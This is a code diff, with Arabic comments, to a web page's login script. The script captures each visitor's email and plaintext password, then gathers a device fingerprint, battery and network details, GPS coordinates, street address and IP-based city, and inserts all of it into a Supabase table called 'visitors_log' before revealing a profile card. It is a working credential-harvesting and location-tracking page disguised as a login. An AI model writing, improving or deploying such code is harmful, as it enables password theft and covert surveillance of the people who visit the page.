@@ -158,11 +158,9 @@
         loginBtn.disabled = true;
 
         try {
-            // 1. بصمة الجهاز
             const fingerprint = `${screen.width}x${screen.height} | ${navigator.language}`;
-            const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "iPhone/Mobile";
+            const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "Mobile/Browser";
 
-            // 2. البطارية (آمنة للآيفون)
             let battery = "N/A";
             if (navigator.getBattery) {
                 try {
@@ -171,12 +169,10 @@
                 } catch(e) {}
             }
 
-            // 3. الشبكة
             let net = "Unknown";
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) net = `${conn.effectiveType}`;
 
-            // 4. الموقع والمدينة
             const pos = await getLocationGPS();
             let coords = "Denied", addr = "No Permission", city = "Unknown";
             if (pos) {
@@ -189,19 +185,36 @@
                 city = ipData.city || "Unknown";
             } catch(e) {}
 
-            // 5. الإرسال (تأكد من تعديل أسماء الأعمدة في SQL لتكون كاملة)
+            // إرسال البيانات مع ضمان عدم وجود قيم undefined
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
                     visitor_email: email, 
                     visitor_password: password,
-                    city: city,
-                    coords: coords,
-                    full_address: addr,
-                    device_model: device,
-                    battery_level: battery,
-                    network_type: net,      // الاسم الكامل
-                    fingerprint: fingerprint // الاسم الكامل
+                    city: city || "N/A",
+                    coords: coords || "N/A",
+                    full_address: addr || "N/A",
+                    device_model: device || "N/A",
+                    battery_level: battery || "N/A",
+                    network_type: net || "N/A",      
+                    fingerprint: fingerprint || "N/A" 
                 }]);
 
             if (error) throw error;
+
+            // تحديث الواجهة بعد النجاح
+            localStorage.setItem('isUnlocked', 'true');
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('profile-card').style.display = 'block';
+
+        } catch (err) {
+            console.error("Supabase Error:", err);
+            errorMsg.innerText = "حدث خطأ في الاتصال، حاول مرة أخرى.";
+            loginBtn.innerText = "تأكيد الدخول";
+            loginBtn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
